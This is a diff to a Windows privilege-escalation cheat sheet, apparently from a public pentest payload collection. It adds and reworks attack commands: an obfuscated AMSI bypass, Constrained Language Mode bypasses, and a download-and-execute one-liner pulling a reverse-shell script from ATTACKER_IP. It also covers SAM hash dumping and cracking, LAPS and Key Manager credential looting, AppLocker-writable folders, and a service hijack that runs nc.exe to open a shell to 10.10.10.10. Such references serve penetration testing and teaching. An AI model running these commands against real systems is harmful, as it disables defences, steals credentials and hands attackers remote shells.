@@ -14,6 +14,7 @@
     * [Default Writeable Folders](#default-writeable-folders)
 * [EoP - Looting for passwords](#eop---looting-for-passwords)
     * [SAM and SYSTEM files](#sam-and-system-files)
+    * [LAPS Settings](#laps-settings)
     * [HiveNightmare](#hivenightmare)
     * [Search for file contents](#search-for-file-contents)
     * [Search for a file with a certain filename](#search-for-a-file-with-a-certain-filename)
@@ -22,6 +23,7 @@
     * [Wifi passwords](#wifi-passwords)
     * [Sticky Notes passwords](#sticky-notes-passwords)
     * [Passwords stored in services](#passwords-stored-in-services)
+    * [Passwords stored in Key Manager](#passwords-stored-in-key-manager)
     * [Powershell History](#powershell-history)
     * [Powershell Transcript](#powershell-transcript)
     * [Password in Alternate Data Stream](#password-in-alternate-data-stream)
@@ -313,15 +315,15 @@ netsh Advfirewall set allprofiles state off
 ### AppLocker Enumeration
 
 - With the GPO
-- HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script).
-
+- `HKLM\SOFTWARE\Policies\Microsoft\Windows\SrpV2` (Keys: Appx, Dll, Exe, Msi and Script).
 
 * List AppLocker rules
     ```powershell
     PowerView PS C:\> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
     ```
 
-* Applocker Bypass
+* AppLocker Bypass
+    * By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writtable by any users
     * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
     * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md
     * https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md
@@ -335,23 +337,20 @@ C:\windows\syswow64\windowspowershell\v1.0\powershell
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell
 ```
 
-Powershell Constrained Mode
+#### Powershell Constrained Mode
 
-```powershell
-# Check if we are in a constrained mode
-$ExecutionContext.SessionState.LanguageMode
+* Check if we are in a constrained mode: `$ExecutionContext.SessionState.LanguageMode`
+* [bypass-clm - PowerShell Constrained Language Mode Bypass](https://github.com/calebstewart/bypass-clm)
+* [PowerShdll - Powershell with no Powershell.exe via DLL's](https://github.com/p3nt4/PowerShdll): `rundll32.exe C:\temp\PowerShdll.dll,main`
+* Other bypasses
+    ```powershell
+    PS > &{ whoami }
+    powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
+    ```
 
-PS > &{ whoami }
-powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
+#### AMSI Bypass
 
-# PowerShDLL - Powershell with no Powershell.exe via DLL’s
-# https://github.com/p3nt4/PowerShdll
-ftp> rundll32.exe C:\temp\PowerShdll.dll,main
-```
-
-
-
-Example of AMSI Bypass.
+Find more AMSI bypass: [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20AMSI%20Bypass.md)
 
 ```powershell
 PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)
@@ -363,10 +362,22 @@ PS C:\> [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetF
 ```powershell
 C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 C:\Windows\System32\spool\drivers\color
-C:\Windows\Tasks
+C:\Windows\System32\spool\printers
+C:\Windows\System32\spool\servers
 C:\Windows\tracing
 C:\Windows\Temp
 C:\Users\Public
+C:\Windows\Tasks
+C:\Windows\System32\tasks
+C:\Windows\SysWOW64\tasks
+C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
+C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
+C:\Windows\debug\wia
+C:\Windows\registration\crmlog
+C:\Windows\System32\com\dmp
+C:\Windows\SysWOW64\com\dmp
+C:\Windows\System32\fxstmp
+C:\Windows\SysWOW64\fxstmp
 ```
 
 ## EoP - Looting for passwords
@@ -392,8 +403,17 @@ pwdump SYSTEM SAM > /root/sam.txt
 samdump2 SYSTEM SAM -o sam.txt
 ```
 
-Either crack it with `john -format=NT /root/sam.txt` or use Pass-The-Hash.
+Either crack it with `john -format=NT /root/sam.txt`, [hashcat](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Hash%20Cracking.md#hashcat) or use Pass-The-Hash.
 
+### LAPS Settings
+
+Extract `HKLM\Software\Policies\Microsoft Services\AdmPwd` from Windows Registry.
+
+* LAPS Enabled: AdmPwdEnabled
+* LAPS Admin Account Name: AdminAccountName
+* LAPS Password Complexity: PasswordComplexity
+* LAPS Password Length: PasswordLength
+* LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled
 
 ### HiveNightmare
 
@@ -577,6 +597,15 @@ Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
 
+
+### Passwords stored in Key Manager
+
+:warning: This software will display its output in a GUI
+
+```ps1
+rundll32 keymgr,KRShowKeyMgr
+```
+
 ### Powershell History
 
 Disable Powershell history: `Set-PSReadlineOption -HistorySaveStyle SaveNothing`.
@@ -710,7 +739,7 @@ Prerequisite: Service account
 PS C:\Windows\system32> sc.exe stop UsoSvc
 PS C:\Windows\system32> sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe"
 PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe"
-PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"
 PS C:\Windows\system32> sc.exe qc usosvc
 [SC] QueryServiceConfig SUCCESS
 
